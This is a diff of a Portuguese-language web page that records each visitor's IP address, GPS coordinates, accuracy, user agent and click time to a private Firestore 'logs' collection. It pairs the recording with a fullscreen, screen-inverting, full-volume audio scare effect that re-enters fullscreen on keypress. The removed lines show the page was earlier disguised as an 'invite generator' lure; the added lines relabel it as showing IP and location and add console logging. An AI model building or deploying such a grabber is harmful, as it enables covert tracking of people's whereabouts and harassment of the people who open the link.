@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Abrir</title>
+<link rel="icon" href="data:,">
 
 <style>
 * { box-sizing: border-box; }
@@ -116,9 +117,9 @@ button {
 <body>
 
 <div id="startScreen">
-  <h1>skit ~invite generator</h1>
-  <p>real mesmo clique ali</p>
-  <button id="openBtn">aqui</button>
+  <h1>Mostrar IP e localização</h1>
+  <p>Ao clicar, será pedido acesso à localização.</p>
+  <button id="openBtn">Abrir</button>
 </div>
 
 <div id="effectScreen">
@@ -135,7 +136,7 @@ button {
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-/* Mete aqui a TUA config do Firebase */
+/* SUBSTITUI PELOS DADOS DO TEU FIREBASE */
 const firebaseConfig = {
   apiKey: "METE_AQUI",
   authDomain: "METE_AQUI",
@@ -161,22 +162,32 @@ const audio3 = document.getElementById("audio3");
 let invertInterval = null;
 let cachedIP = "UNKNOWN";
 let effectStarted = false;
+let lastClickTime = null;
 
 /* Buscar IP logo ao carregar */
-fetch("https://api.ipify.org?format=json")
-  .then(res => res.json())
-  .then(data => {
+async function preloadIP() {
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
     cachedIP = data.ip || "UNKNOWN";
-    if (effectStarted) text.textContent = cachedIP;
-  })
-  .catch(() => {
+    if (effectStarted) {
+      text.textContent = cachedIP;
+    }
+    console.log("IP carregado:", cachedIP);
+  } catch (error) {
     cachedIP = "ERROR";
-    if (effectStarted) text.textContent = cachedIP;
-  });
+    if (effectStarted) {
+      text.textContent = cachedIP;
+    }
+    console.error("Erro ao obter IP:", error);
+  }
+}
+
+preloadIP();
 
 async function enterFullscreen() {
   const el = document.documentElement;
-  if (el.requestFullscreen) {
+  if (el.requestFullscreen && !document.fullscreenElement) {
     await el.requestFullscreen();
   }
 }
@@ -205,39 +216,54 @@ function stopAllAudio() {
 }
 
 async function saveToFirestore(payload) {
+  console.log("Vou guardar no Firestore:", payload);
+
   try {
-    await addDoc(collection(db, "logs"), {
+    const docRef = await addDoc(collection(db, "logs"), {
       ...payload,
       createdAt: serverTimestamp()
     });
-    console.log("Guardado no Firestore:", payload);
+
+    console.log("Guardado com sucesso. ID:", docRef.id);
+
     locationText.textContent =
-      `Guardado: LAT ${payload.latitude.toFixed(5)} | LON ${payload.longitude.toFixed(5)} | IP ${payload.ip}`;
+      `Guardado às ${payload.clickedAtLocal} | IP ${payload.ip}`;
   } catch (error) {
     console.error("Erro ao guardar no Firestore:", error);
-    locationText.textContent = "Erro ao guardar no Firebase.";
+    locationText.textContent = "Erro ao guardar no Firebase: " + error.message;
   }
 }
 
 function requestLocationAndSave() {
   if (!navigator.geolocation) {
     locationText.textContent = "Geolocalização não suportada neste browser.";
+    console.log("Geolocalização não suportada.");
     return;
   }
 
   locationText.textContent = "A pedir permissão de localização...";
+  console.log("A pedir localização...");
 
   navigator.geolocation.getCurrentPosition(
     async (position) => {
+      console.log("Localização recebida:", position);
+
+      const clickDate = lastClickTime || new Date();
+
       const payload = {
         ip: cachedIP,
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
         accuracy: position.coords.accuracy,
-        userAgent: navigator.userAgent
+        userAgent: navigator.userAgent,
+        clickedAtISO: clickDate.toISOString(),
+        clickedAtLocal: clickDate.toLocaleString("pt-PT")
       };
 
+      console.log("Payload:", payload);
       await saveToFirestore(payload);
+
+      text.textContent = cachedIP;
     },
     (error) => {
       console.error("Erro ao obter localização:", error);
@@ -267,16 +293,20 @@ function requestLocationAndSave() {
 async function startEffect() {
   if (effectStarted) return;
   effectStarted = true;
+  lastClickTime = new Date();
 
   try {
     await enterFullscreen();
-  } catch (e) {}
+  } catch (e) {
+    console.warn("Não foi possível entrar em fullscreen:", e);
+  }
 
   startScreen.style.display = "none";
   effectScreen.style.display = "flex";
 
   startInvertEffect();
   text.textContent = cachedIP;
+  locationText.textContent = "A pedir IP e localização...";
 
   audio1.volume = 1;
   audio2.volume = 1;
@@ -297,6 +327,7 @@ document.addEventListener("keydown", async (e) => {
     stopAllAudio();
 
     effectStarted = false;
+    lastClickTime = new Date();
 
     try {
       await enterFullscreen();
